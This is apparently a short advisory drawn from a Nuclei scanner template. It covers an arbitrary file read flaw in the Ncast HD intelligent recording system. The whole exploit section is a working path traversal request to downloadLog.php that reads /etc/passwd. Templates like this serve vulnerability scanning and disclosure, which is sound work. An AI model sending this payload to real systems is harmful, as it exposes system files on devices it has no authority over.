# Nuclei Template: Ncast HD Intelligent Recording - Arbitrary File Reading
**Template ID:** ncast-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`ncast-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Ncast HD intelligent recording and broadcasting system has an arbitrary file reading vulnerability.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/developLog/downloadLog.php?name=../../../../etc/passwd
```

## References
- https://github.com/wy876/POC/blob/main/Ncast%E9%AB%98%E6%B8%85%E6%99%BA%E8%83%BD%E5%BD%95%E6%92%AD%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
